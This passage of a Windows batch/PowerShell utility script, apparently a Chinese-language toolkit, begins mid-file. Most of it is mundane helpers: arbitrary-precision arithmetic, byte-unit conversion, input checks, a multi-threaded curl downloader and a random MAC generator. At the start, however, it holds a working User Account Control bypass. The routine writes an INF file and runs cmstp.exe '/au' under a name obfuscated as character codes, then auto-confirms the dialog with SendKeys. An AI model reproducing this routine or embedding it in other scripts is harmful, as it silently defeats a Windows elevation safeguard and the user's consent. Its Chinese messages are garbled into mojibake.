"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@
	$InfContent | Out-File $InfFileLocation -Encoding ASCII
}
Function Get-Hwnd {
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
		[string]$ProcessName
	)
	Process {
		$ErrorActionPreference = 'Stop'
		Try {
			$hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
		} Catch {
			$hwnd = $null
		}
		$hash = @{
			ProcessName = $ProcessName
			Hwnd		= $hwnd
		}
		New-Object -TypeName PsObject -Property $hash
	}
}
Function Set-WindowActive {
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
		[string]$Name
	)
	Process {
		$memberDefinition = @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@
		Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
		$hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
		If ($hwnd) {
			[User32.Api]::SetForegroundWindow($hwnd)
			[User32.Api]::ShowWindow($hwnd, 5)
		} Else {
			[string]$hwnd = 'N/A'
		}
		$hash = @{
			Process = $Name
			Hwnd	= $hwnd
		}
		New-Object -TypeName PsObject -Property $hash
	}
}
. Set-INFFile
#Needs Windows forms
Add-Type -AssemblyName System.Windows.Forms
If (Test-Path $InfFileLocation) {
	#Command to run
	$ps = New-Object System.Diagnostics.ProcessStartInfo "$env:windir\system32\$([char]99)$([char]109)$([char]115)$([char]116)$([char]112).exe"
	$ps.Arguments = "/au $InfFileLocation"
	$ps.UseShellExecute = $false
	#Start it
	[System.Diagnostics.Process]::Start($ps)
	do {
		#Do nothing until cmstp is an active window
	} until ((Set-WindowActive -Name "$([char]99)$([char]109)$([char]115)$([char]116)$([char]112)").Hwnd -ne 0)
	#Activate window
	Set-WindowActive -Name "$([char]99)$([char]109)$([char]115)$([char]116)$([char]112)"
	#Send the Enter key
	[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}
#su#
:xdwjs
setlocal
if "%1" equ "" (goto :eof)
if "%3" equ "" (goto :eof)
set "Bytes=%1"
set "danwei=%2"
if /i "!danwei!" equ "kb" (call :scf !bytes! 1024 bytes)
if /i "!danwei!" equ "mb" (call :scf !bytes! 1048576 bytes)
if /i "!danwei!" equ "gb" (call :scf !bytes! 1073741824 bytes)
if "%3" equ "" (goto :eof)
call :div !Bytes! 1152921504606846976 2 OK
if "!OK:~0,2!" equ "0." (
	call :div !Bytes! 1125899906842624 2 OK
) else (
	endlocal&set "%3=%OK% EB"
	goto :eof
)
if "!OK:~0,2!" equ "0." (
	call :div !Bytes! 1099511627776 2 OK
) else (
	endlocal&set "%3=%OK% PB"
	goto :eof
)
if "!OK:~0,2!" equ "0." (
	call :div !Bytes! 1073741824 2 OK
) else (
	endlocal&set "%3=%OK% TB"
	goto :eof
)
if "!OK:~0,2!" equ "0." (
	call :div !Bytes! 1048576 2 OK
) else (
	endlocal&set "%3=%OK% GB"
	goto :eof
)
if "!OK:~0,2!" equ "0." (
	call :div !Bytes! 1024 2 OK
) else (
	endlocal&set "%3=%OK% MB"
	goto :eof
)
if "!OK:~0,2!" equ "0." (
	endlocal&set "%3=%Bytes% Byte"
	goto :eof
) else (
	endlocal&set "%3=%OK% KB"
	goto :eof
)
:scf
setlocal
if "%~1" equ "0" (
	endlocal&set "%~3=0"
	goto :eof
)
if "%~2" equ "0" (
	endlocal&set "%~3=0"
	goto :eof
)
set f=
set jia=
set ji=
set n1=0
set n2=0
set vard1=
set vard2=
set "var1=%~1"
set "var2=%~2"
for /l %%a in (0 1 9) do (
	set "var1=!var1:%%a= %%a !"
	set "var2=!var2:%%a= %%a !"
)
for %%a in (!var1!) do (
	set /a "n1+=1"
	set "vard1=%%a !vard1!"
)
for %%a in (!var2!) do (
	set /a "n2+=1"
	set "vard2=%%a !vard2!"
)
if !n1! gtr !n2! (
	set "vard1=%vard2%"
	set "vard2=%vard1%"
)
for %%a in (!vard1!) do (
	set t=
	set /a j=0
	for %%b in (!vard2!) do (
		if "!jia!" equ "" (set jia=0)
		set /a "a=%%a*%%b+j+!jia:~-1!"
		set "t=!a:~-1!!t!"
		set "a=0!a!"
		set "j=!a:~-2,1!"
		set "jia=!jia:~0,-1!"
	)
	set "ji=!t:~-1!!ji!"
	if "!j:~0,1!" equ "0" (set ss=) else (set "ss=!j:~0,1!")
	set "jia=!ss!!t:~0,-1!"
)
if not "!j:~0,1!" equ "0" (set "t=!j:~0,1!!t!")
set "ji=!t!!ji:~1!"
endlocal&set "%~3=%ji%"
goto :eof
:div
setlocal
if "%4" equ "" (goto :eof)
set "Div.1=%1"
set "Div.2=%2"
set Div.3=
set Div.I=0
set "Div.D=%3"
set Div.1.Len.0=
set Div.2.Len.0=
set Div.Z=00000000
for /l %%i in (1 1 9) do (set Div.Num.%%i=)
for /l %%i in (1 1 7) do (set "Div.Z=!Div.Z!!Div.Z!")
set "Div.H=4096 2048 1024 512 256 128 64 32 16 8 4 2 1"
for /l %%i in (1 1 2) do (
	set Div.N=0
	set Div.%%i.Len.2=0
	for %%j in (!Div.%%i:.^= !) do (
		set /a "Div.N+=1"
		set "Div.M=Div.M%%j"
		set Div.%%i.Len.!Div.N!=0
		for %%l in (!Div.H!) do (
			if "!Div.M:~%%l!" neq "" (
				set /a "Div.%%i.Len.!Div.N!+=%%l"
				set "Div.M=!Div.M:~%%l!"
			)
		)
		set /a "Div.%%i.Len.0+=Div.%%i.Len.!Div.N!"
	)
	set "Div.%%i=!Div.%%i:.=!"
)
if !Div.1.Len.2! gtr !Div.2.Len.2! (
	set /a "Div.2.Len.0+=Div.1.Len.2-Div.2.Len.2"
) else (
	set /a "Div.1.Len.0+=Div.2.Len.2-Div.1.Len.2"
)
for /l %%i in (1 1 2) do (
	set "Div.%%i=!Div.%%i!!Div.Z!"
	for %%j in (!Div.%%i.Len.0!) do (set "Div.%%i=!Div.%%i:~,%%j!")
)
for /f "tokens=* delims=0" %%i in ("!Div.2!") do (
	set "Div.O=%%i"
	set "Div.2=0%%i"
)
set Div.2.Len.0=1
for %%i in (!Div.H!) do (
	if "!Div.O:~%%i!" neq "" (
		set /a "Div.2.Len.0+=%%i"
		set "Div.O=!Div.O:~%%i!"
	)
)
set /a "Div.Len=Div.2.Len.0+1"
if !Div.1.Len.0! lss !Div.2.Len.0! (
	set "Div.1.Len.0=!Div.2.Len.0!"
	set "Div.1=!Div.Z:~-%Div.2.Len.0%,-%Div.1.Len.0%!!Div.1!"
)
set /a "Div.1.Len.0+=Div.D"
set "Div.1=0!Div.1!!Div.Z:~,%Div.D%!"
set "Div.P=!Div.1:~,%Div.2.Len.0%!"
set "Div.T=0000000!Div.2!"
set /a "Div.J+=1"
set /a "Div.Tem.Len=Div.2.Len.0+7"
if "!Div.J!" equ "1" (
	for %%i in (!1:~-1!) do (
		for /f "delims=" %%j in ("!%%i!") do (
			if "%%~Zj" equ "!%Div.I%!" (set "C=!Div.D!")
		)
	)
)
for /l %%i in (1 1 9) do (
	set Div.V=0
	for /l %%j in (8 8 !Div.Tem.Len!) do (
		set /a "Div.V=1!Div.T:~-%%j,8!*%%i+Div.V"
		set "Div.Num.%%i=!Div.V:~-8!!Div.Num.%%i!"
		set /a "Div.V=!Div.V:~,-8!-%%i"
	)
	set "Div.Num.%%i=!Div.V!!Div.Num.%%i!"
	set "Div.Num.%%i=0000000!Div.Num.%%i:~-%Div.Len%!"
)
for /l %%l in (!Div.2.Len.0! 1 !Div.1.Len.0!) do (
	set "Div.P=!Div.Z!!Div.P!!Div.1:~%%l,1!"
	set "Div.P=!Div.P:~-%Div.Len%!"
	if "!Div.J!" equ "1" (
		set Div.I.Tem=
		for %%i in (!%Div.I%!) do (set "Div.D.Tem=%%i")
		for /l %%i in (0 1 9) do (set "Div.D.Tem=!Div.D.Tem:%%i=%%i !")
		for %%i in (!Div.D.Tem!) do (set /a "Div.I.Tem=!Div.I.Tem!+%%i")
		if "!Div.I.Tem!" neq "24" (set C=)
	)
	if "!Div.P!" geq "!Div.2!" (
		set Div.R=1
		set "Div.S=0000000!Div.P!"
		for /l %%i in (2 1 9) do (
			if "!Div.S!" geq "!Div.Num.%%i!" (set "Div.R=%%i")
		)
		set "Div.3=!Div.3!!Div.R!"
		set Div.P=
		set Div.V=0
		for %%i in (!Div.R!) do (
			for /l %%j in (8 8 !Div.Tem.Len!) do (
				set /a "Div.V=3!Div.S:~-%%j,8!-1!Div.Num.%%i:~-%%j,8!-!Div.V:~,1!%%2"
				set "Div.P=!Div.V:~1!!Div.P!"
			)
		)
	) else (
		set "Div.3=!Div.3!0"
	)
)
if defined Div.D (
	if !Div.D! gtr 0 (set "Div.3=!Div.3:~,-%Div.D%!.!Div.3:~-%Div.D%!")
)
for /f "tokens=* delims=0" %%i in ("!Div.3!") do (set "Div.3=%%i")
if "!Div.3:~0,1!" equ "." (set "Div.3=0!Div.3!")
if "!Div.3!" equ "" (set Div.3=0)
endlocal&set "%4=%Div.3%"
goto :eof
:cf
setlocal
call :cf_1 %1 %2 %3 jg
endlocal&set "%4=%jg%"
goto :eof
:cf_1
set num=0
set dec_str=
set input=
if "%4" equ "" (goto :eof)
set /a "int_str=%1/%2"
set /a "mod=%1%%%2"
if "!mod!" equ "0" (goto cf_3)
:cf_4
set "mod=!mod!0"
if !mod! lss %2 (
	set "dec_str=!dec_str!0"
	goto cf_4
) else (
	set /a "dec=mod/%2"
	set "dec_str=!dec_str!!dec!"
	set /a "mod=mod%%%2"
)
set /a "num+=1"
if "!mod!" neq "0" (
	if !num! lss %3 (goto cf_4)
)
:cf_3
for /l %%a in (1,1,%3) do (set "zero_str=!zero_str!0")
set "dec_str=!dec_str!!zero_str!"
set "%4=!int_str!.!dec_str:~0,%3!"
goto :eof
#offdisplay#
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
	[DllImport("user32.dll",SetLastError = true)]
	public static extern int SendMessage(int hWnd,int hMsg,int wParam,int lParam);
}
"@
[User32]::SendMessage(-1,0x0112,0xF170,2)
#offdisplay#
:choice
if not defined cho set ("cho=1234567890")
set %1=
choice /c !cho! /n /m "����ѡ��: "
set "%1=%errorlevel%"
goto :eof
:set
set %1=
set /p "%1=����ѡ��: "
call :var %1
goto :eof
:checkvar
setlocal
if "%1" equ "" (goto :eof) else (set "val=!%1!")
if "%2" equ "num" (goto checkvar_num)
if "%2" equ "num." (goto checkvar_num.)
if "%2" equ "-num" (goto checkvar_-num)
if "%2" equ "-num." (goto checkvar_-num.)
if "%2" equ "az" (goto checkvar_az)
if "%2" equ "aznum" (goto checkvar_aznum)
if "%2" equ "year" (goto checkvar_year)
goto :eof
:checkvar_num
if defined %1 (
	for /f "delims=0123456789" %%a in ("!%1!") do (goto checkvar_exit0)
) else (
	goto checkvar_exit0
)
goto checkvar_exit1
:checkvar_num.
if defined %1 (
	for /f "delims=.0123456789" %%a in ("!%1!") do (goto checkvar_exit0)
) else (
	goto checkvar_exit0
)
for /f "tokens=1,2 delims=." %%a in ("!%1!") do (
	if "%%a" neq "" (set "val1=%%a") else (set "val1=0")
	if "%%b" neq "" (set "val2=%%b") else (goto checkvar_exit0)
)
if "!val1!!val2!" neq "" (goto checkvar_exit1) else (goto checkvar_exit0)
goto :eof
:checkvar_-num
if defined %1 (
	for /f "delims=0123456789-" %%a in ("!%1!") do (goto checkvar_exit0)
) else (
	goto checkvar_exit0
)
for /f "tokens=1 delims=-" %%a in ("!%1!") do (
	if "!%1:~0,1!" equ "-" (goto checkvar_exit1) else (goto checkvar_exit0)
)
goto :eof
:checkvar_-num.
set "val1=!val:~1!"
set "val2=!val:.=!"
if defined val1 (
	call :checkvar val1 num.||(
		call :checkvar val2 -num jg||goto checkvar_exit1
	)
)
goto checkvar_exit0
:checkvar_az
if defined %1 (
	for /f "delims=aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ" %%a in ("!%1!") do (goto checkvar_exit0)
	goto checkvar_exit1
)
goto :eof
:checkvar_aznum
if defined %1 (
	for /f "delims=0123456789aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ" %%a in ("!%1!") do (goto checkvar_exit0)
	goto checkvar_exit1
)
goto checkvar_exit0
:checkvar_year
if defined %1 (
	for /f "delims=0123456789" %%a in ("!%1!") do (goto checkvar_exit0)
	call :strlen %1 jg
	if "!jg!" neq "8" (goto checkvar_exit0)
	set "year=!%1:~0,4!"
	set "month=!%1:~4,2!"
	set "day=!%1:~6,2!"
	if 1!month! lss 101 (goto checkvar_exit0)
	if 1!month! gtr 112 (goto checkvar_exit0)
	if 1!day! lss 101 (goto checkvar_exit0)
	if 1!day! gtr 131 (goto checkvar_exit0)
	if "!month!" equ "04" (
		if 1!day! gtr 130 (goto checkvar_exit0)
	)
	if "!month!" equ "06" (
		if 1!day! gtr 130 (goto checkvar_exit0)
	)
	if "!month!" equ "09" (
		if 1!day! gtr 130 (goto checkvar_exit0)
	)
	if "!month!" equ "11" (
		if 1!day! gtr 130 (goto checkvar_exit0)
	)
	if "!month!" equ "02" (
		set /a "leap=year%%4"
		set /a "leap100=year%%100"
		set /a "leap400=year%%400"
		if "!leap!" equ "0" (
			if "!leap100!" neq "0" (
				if 1!day! gtr 129 (goto checkvar_exit0)
			)
		) else (
			if 1!day! gtr 128 (goto checkvar_exit0)
		)
		if "!leap100!" equ "0" (
			if "!leap400!" neq "0" (
				if 1!day! gtr 128 (goto checkvar_exit0)
			)
		)
		if "!leap400!" equ "0" (
			if 1!day! gtr 129 (goto checkvar_exit0)
		)
	)
	goto checkvar_exit1
) else (
	goto checkvar_exit0
)
:checkvar_exit0
exit /b 0
:checkvar_exit1
exit /b 1
:var
if defined %1 (
	set "%1=!%1:"=!"
	for /f "delims=&|%%!!" %%a in (""!%1!"") do (
		set "%1=%%~a"
	)
)
goto :eof
:sqrt
setlocal
set "s=%1"
set "w=%2"
if defined W (
	for /l %%i in (1 1 !W!) do (set "s=!s!00")
) else (
	set W=0
)
set "p=!s!"
set len=0
set N=0
for %%i in (4096 2048 1024 512 256 128 64 32 16 8 4 2 1) do (
	if "!p:~%%i!" neq "" (
		set /a "len+=%%i"
		set "p=!p:~%%i!"
	)
)
set /a "N-=~(len%%2)"
set "M=!s:~,%N%!"
for /l %%i in (1 1 9) do (
	set /a "Mx=%%i*%%i"
	if !Mx! leq !M! (
		set "i=%%i"
		set /a "j=100+M-Mx"
	)
)
set /a "len-=1"
set /a "Len_i=_N=i/5+1"
set /a "p=i*20"
set "j=!j:~-%_N%!"
set "p=0!p!"
set kl=0000000
set /a "_N=8-_N"
for /l %%i in (!N! 2 !len!) do (
	set "j=!j!!s:~%%i,2!"
	if "!j:0=!" neq "" (
		set /a "Ln_i=Len_i+=2"
		if !p! lss !j! (
			set d=Z
			set "in=!kl!!P!"
			set /a "Ln_i+=7"
			for /l %%j in (9 -1 2) do (
				if !d! gtr !j! (
					set "x=%%j"
					set d=
					set /a "b=x*x"
					for /l %%k in (8 8 !Ln_i!) do (
						set /a "b=1!in:~-%%k,8!*%%j+b"
						set "d=!b:~-8!!d!"
						set /a "b=!b:~,-8!-%%j"
					)
					set "d=!b!!d!"
					for %%k in (!Len_i!) do (set "d=!d:~-%%k!")
				)
			)
			if !d! gtr !j! (
				set "d=!in!"
				set x=1
				set b=1
			) else (
				set "d=!kl!!d!"
				set b=0
			)
			set "j=!kl!!j!"
			set t=
			for /l %%j in (8 8 !Ln_i!) do (
				set /a "b=3!j:~-%%j,8!-1!d:~-%%j,8!-!b:~,1!%%2"
				set "t=!b:~1!!t!"
			)
			for %%j in (!Len_i!) do (set "j=!t:~-%%j!")
			set "j=!j:~1!"
		) else (
			set x=0
		)
		set /a "Len_i-=1"
		if "!x!" neq "0" (
			if "!x!" geq "5" (
				set p=
				set b=0
				set "in=!kl!!i!!x!"
				set /a "Ln_i=Len_i+_N"
				for /l %%j in (8 8 !Ln_i!) do (
					set /a "b=1!in:~-%%j,8!*2+!b:~,1!%%2"
					set "p=!b:~1!!p!"
				)
				set /a "b=!b:~,1!%%2"
				for %%j in (!Len_i!) do (set "p=!b:1=01!!p:~-%%j!0")
			) else (
				set /a "t=x*2"
				set "p=!p:~,-1!!t!0"
			)
		) else (
			set "p=!p!0"
			set "j=!j:~1!"
		)
	) else (
		set "j=!j:~1!"
		set "p=!p!0"
		set /a "Len_i+=1"
		set x=0
	)
	set "i=!i!!x!"
)
for /f "tokens=* delims=." %%i in ("!i:~,-%W%!.!i:~-%W%!") do (endlocal&set "%3=%%i")
goto :eof
:10to16
setlocal
set "ran=%1"
set ss=
:10to16_1
set /a "s=!ran!%%16"
if !s! lss 10 (goto 10to16_3)
if !s! gtr 12 (goto 10to16_2)
if "!s!" equ "10" (
	set s=A
) else (
	if "!s!" equ "11" (
		set s=B
	) else (
		if "!s!" equ "12" (
			set s=C
		)
	)
)
goto 10to16_3
:10to16_2
if "!s!" equ "13" (
	set s=D
) else (
	if "!s!" equ "14" (
		set s=E
	) else (
		if "!s!" equ "15" (
			set s=F
		)
	)
)
:10to16_3
set "ss=!s!!ss!"
set /a "ran/=16"
if "!ran!" neq "0" (goto 10to16_1)
if "%2" neq "" (
	endlocal&set "%2=%ss%"
) else (
	echo;!ss!
)
goto :eof
:10to2
setlocal
set "num=%1"
set num1=
:10to2_1
set /a "e=num%%2"
set /a "num/=2"
set "num1=!e!!num1!"
if "!num!" neq "0" (goto 10to2_1)
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	echo;!num1!
)
goto :eof
:10to8
setlocal
set "num=%1"
set num1=
:10to8_2
set /a "b=num%%8"
set /a "num/=8"
set "num1=!b!!num1!"
if "!num!" neq "0" (goto 10to8_2)
if "%2" neq "" (
	endlocal&set "%2=%num1%"
) else (
	echo;!num1!
)
goto :eof
:2to10
setlocal
set nn=
set "nnn=1"
set "n=%1"
set "n=!n:0= 0!"
set "n=!n:1= 1!"
for %%a in (!n!) do (set "nn=%%a !nn!")
for %%a in (!nn!) do (set /a "num+=%%a*nnn,nnn*=2")
if "%2" neq "" (
	endlocal&set "%2=%num%"
) else (
	echo;!num!
)
goto :eof
:pdxp
if /i "!caption!" equ "Microsoft Windows XP Home" (set "system= - Windows XP ��ͥ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows XP Professional" (set "system= - Windows XP רҵ��"&goto :eof)
set "system= - !caption:~10!"
goto :eof
:pd7
if /i "!caption!" equ "Microsoft Windows 7 Ultimate" (set "system= - Windows 7 �콢��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 7 Home Basic" (set "system= - Windows 7 ��ͥ��ͨ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 7 Home Premium" (set "system= - Windows 7 ��ͥ�߼���"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 7 Professional" (set "system= - Windows 7 רҵ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 7 Enterprise" (set "system= - Windows 7 ��ҵ��"&goto :eof)
set "system= - !caption:~10!"
goto :eof
:pd8
if /i "!caption!" equ "Microsoft Windows 8 Pro" (set "system= - Windows 8 רҵ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 8 China" (set "system= - Windows 8 �й���"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 8 Enterprise" (set "system= - Windows 8 ��ҵ��"&goto :eof)
set "system= - !caption:~10!"
goto :eof
:pd8.1
if /i "!caption!" equ "Microsoft Windows 8.1 Pro" (set "system= - Windows 8.1 רҵ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 8.1 China" (set "system= - Windows 8.1 �й���"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 8.1 Enterprise" (set "system= - Windows 8.1 ��ҵ��"&goto :eof)
set "system= - !caption:~10!"
goto :eof
:pd10
if /i "!caption!" equ "Microsoft Windows 10 Home" (set "system= - Windows 10 ��ͥ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 10 Professional" (set "system= - Windows 10 רҵ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 10 Education" (set "system= - Windows 10 ������"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 10 Enterprise" (set "system= - Windows 10 ��ҵ��"&goto :eof)
set "system= - !caption:~10!"
goto :eof
:pd11
if /i "!caption!" equ "Microsoft Windows 11 Home" (set "system= - Windows 11 ��ͥ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 11 Professional" (set "system= - Windows 11 רҵ��"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 11 Education" (set "system= - Windows 11 ������"&goto :eof)
if /i "!caption!" equ "Microsoft Windows 11 Enterprise" (set "system= - Windows 11 ��ҵ��"&goto :eof)
set "system= - !caption:~10!"
goto :eof
:convertu
setlocal
if "%~1" equ "" (goto :eof)
set "tmp=%~1"
for %%a in (
	"a=A" "b=B" "c=C" "d=D" "e=E"
	"f=F" "g=G" "h=H" "i=I" "j=J"
	"k=K" "l=L" "m=M" "n=N" "o=O"
	"p=P" "q=Q" "r=R" "s=S" "t=T"
	"u=U" "v=V" "w=W" "x=X" "y=Y" "z=Z"
) do (
	set "tmp=!tmp:%%~a!"
)
if "%2" neq "" (
	endlocal&set "%2=%tmp%"
) else (
	echo;!tmp!
)
goto :eof
:convertl
setlocal
if "%~1" equ "" (goto :eof)
set "tmp=%~1"
for %%a in (
	"A=a" "B=b" "C=c" "D=d" "E=e"
	"F=f" "G=g" "H=h" "I=i" "J=j"
	"K=k" "L=l" "M=m" "N=n" "O=o"
	"P=p" "Q=q" "R=r" "S=s" "T=t"
	"U=u" "V=v" "W=w" "X=x" "Y=y" "Z=z"
) do (
	set "tmp=!tmp:%%~a!"
)
if "%2" neq "" (
	endlocal&set "%2=%tmp%"
) else (
	echo;!tmp!
)
goto :eof
:curldxc
setlocal
if not exist "!windir!\system32\curl.exe" (
	if not exist "curl.exe" (
		echo;û���ҵ�curl.exe
		goto :eof
	)
)
set "url=%~1"
set "tr=%2"
set "filename=%~3"
set "dir=%~4"
set "par=%~5"
set "doh=--doh-url https://101.101.101.101/dns-query"
set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36""
if not defined url (
	echo;���Ӳ���Ϊ��!
	goto :eof
)
if not defined tr (set tr=8)
for /f "tokens=2 delims==" %%a in ('set tr') do (
	for /f "delims=0123456789" %%a in ("%%a") do (
		echo;�߳���ֻ����������!
		goto :eof
	)
)
if not defined dir (set "dir=%%~dp0")
>nul 2>nul dir /a:d /b "!dir!"||(
	echo;�ļ��� "!dir!" ������
	goto :eof
)
if exist "%temp%\tag" (del /f /q "%temp%\tag")
for /f "skip=2 tokens=3" %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=2 tokens=3" %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
if defined doh (
	echo;����DoH�˿��Ƿ���Ч...
	for /f "tokens=2* delims=/" %%a in ("!doh!") do (
		curl !proxy! -s --connect-timeout 2 --retry 1 --max-time 10 -I -o nul "https://%%a/%%b"
		if errorlevel 1 (
			echo;ʹ��ϵͳĬ��DNS
			set doh=
		) else (
			echo;ʹ��DoH: !doh:~10!
		)
	)
)
curl !proxy! !doh! !par! !ua! -I -# -L --remove-on-error -o tag --connect-timeout 5 --max-time 10 --output-dir "%temp%" "!url!"
if not exist "%temp%\tag" (
	echo;û�л�ȡ���ļ���Ϣ
	goto :eof
)
for /f "tokens=2" %%a in ('findstr /c:"Accept-Ranges:" "%temp%\tag"') do (set "trflag=%%a")
for /f "tokens=2" %%a in ('findstr /c:"Content-Length:" "%temp%\tag"') do (set "filesize=%%a")
del /f /q "%temp%\tag"
if "!trflag!" neq "bytes" (set tr=1)
if not defined filesize (goto curldxc_3)
if "!tr!" equ "1" (goto curldxc_3)
set /a "fd=filesize/tr"
set /a "ys=filesize%%tr"
set oldfd=0
set /a "pdtr=tr-1"
set /a "newfd=fd-1"
set /a "pdfd=fd+ys"
set newtr=
set /a "newtr=tr+1"
set file=
for /l %%a in (1,1,!tr!) do (set "file=!file!%%a+")
set "file=!file:~0,-1!"
>nul 2>nul dir /a:d /b "%temp%\down"&&rd /s /q "%temp%\down"
if exist "%temp%\down" (del /f /q "%temp%\down")
md "%temp%\down"||(
	echo;���ܴ�����ʱ�ļ���: "%temp%\down"
	goto :eof
)
for /l %%a in (1,1,!tr!) do (
	start /b /low "curl���������_%%a" curl !proxy! !doh! !par! !ua! -s -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir "%temp%\down" "!url!"
	set /a "oldfd=newfd+1"
	if "%%a" equ "!pdtr!" (
		set newfd=
	) else (
		set /a "newfd=oldfd+fd-1"
	)
)
pushd "%temp%\down"
:curldxc_2
set ����=
for /l %%a in (1,1,!tr!) do (
	if "%%a" equ "!tr!" (
		if "%%~za" equ "!pdfd!" (
			echo;����%%a���
			set /a "����+=1"
		)
	) else (
		if "%%~za" equ "!fd!" (
			echo;����%%a���
			set /a "����+=1"
		)
	)
)
>nul timeout /t 1 /nobreak
if "!����!" neq "!tr!" (
	set nocurl=
	for /l %%a in (1,1,!tr!) do (
		for /f "tokens=1 delims=," %%a in ('tasklist /fi "imagename eq curl.exe" /fi "windowtitle eq curl���������_%%a" /fo csv /nh') do (
			if /i "%%~a" neq "curl.exe" (set /a "nocurl+=1")
		)
	)
	if "!nocurl!" neq "!tr!" (goto curldxc_2)
)
copy /b /z !file! "!dir!\!filename!"
popd
rd /s /q "%temp%\down"
goto :eof
:curldxc_3
if "!dir:~-1!" equ "\" (set "dir=!dir:~0,-1!")
curl !proxy! !doh! !par! !ua! --compressed -R --remove-on-error -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o "!filename!" --output-dir "!dir!" "!url!"
goto :eof
:pwiex
powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('%~dpnx0') -split '#%~1\#.*';iex ($command[1])"
goto :eof
:out
if exist "!windir!\system32\timeout.exe" (
	>nul timeout /t %1 /nobreak
) else (
	if exist "!windir!\system32\ping.exe" (
		>nul ping /n %1 127.0.0.1
	) else (
		set /a "__out=%1*100"
		call :ys !__out!
		set __out=
	)
)
goto :eof
:lj
setlocal
for /f "delims=" %%a in ("!%1!") do (
	set "var=%%~fa"
	if "!var:~-1!" equ "\" (set "var=!var:~0,-1!")
)
endlocal&set "%2=%var%"
goto :eof
:ljjc
setlocal
if not defined %1 (exit /b 0)
for /f "delims=" %%a in ("!%1!") do (
	set "var=%%~fa"
	set "var=!var:?=!"
	if "!var:~-1!" equ "\" (set "var=!var:~0,-1!")
	if not exist "!var!" (exit /b 0)
)
if "%2" equ "dir" (
	>nul 2>nul dir /a:d /b "!var!"&&(
		endlocal&set "%1=%var%"
		exit /b 1
	)
	exit /b 0
) else (
	>nul 2>nul dir /a:d /b "!var!"||(
		endlocal&set "%1=%var%"
		exit /b 1
	)
	exit /b 0
)
:ranmac
setlocal
set a=0123456789ABCDEF
set /a "b1=!random!%%16,b2=!random!%%16,b3=!random!%%16,b4=!random!%%16,b5=!random!%%16,b6=!random!%%16,b7=!random!%%16,b8=!random!%%16,b9=!random!%%16,b10=!random!%%16,b11=!random!%%16,b12=!random!%%16"
set "c=!a:~%b1%,1!!a:~%b2%,1!:!a:~%b3%,1!!a:~%b4%,1!:!a:~%b5%,1!!a:~%b6%,1!:!a:~%b7%,1!!a:~%b8%,1!:!a:~%b9%,1!!a:~%b10%,1!:!a:~%b11%,1!!a:~%b12%,1!"
if "%1" equ "" (
	echo;!c!
) else (
	endlocal&set "%1=%c%"
)
goto :eof
:bel
pushd "%~dp0"
2>nul forfiles /m "%~nx0" /c "!comspec! /c <nul set /p "=0x07""
popd
goto :eof
:md
if "%~1" equ "" (goto :eof)
setlocal
set "url=%~1"
if "!url:-1!" equ "\" (set "url=!url:0,-1!")
>nul 2>nul dir /a:d /b "!url!"&&rd /s /q "!url!"
if exist "!url!" (del /f /q "!url!")
md "!url!"
endlocal&exit /b %errorlevel%
:curlproxy
for /f "skip=2 tokens=3" %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=2 tokens=3" %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
if defined doh (
	echo;����DoH�˿��Ƿ���Ч...
	for /f "tokens=2* delims=/" %%a in ("!doh!") do (
		curl !proxy! -s --connect-timeout 2 --retry 1 --max-time 10 -I -o nul "https://%%a/%%b"
		if errorlevel 1 (
			echo;ʹ��ϵͳĬ��DNS
			set doh=
		) else (
			echo;ʹ��DoH: https://%%a/%%b
		)
	)
)
goto :eof
:isntfs
setlocal
if "%1" neq "" (
	set "var=%1"
	>nul 2>nul fsutil fsinfo ntfsinfo !var:\=!&&(
		exit /b 1
	)
	exit /b 0
)
goto :eof
:isrefs
if "%1" neq "" (
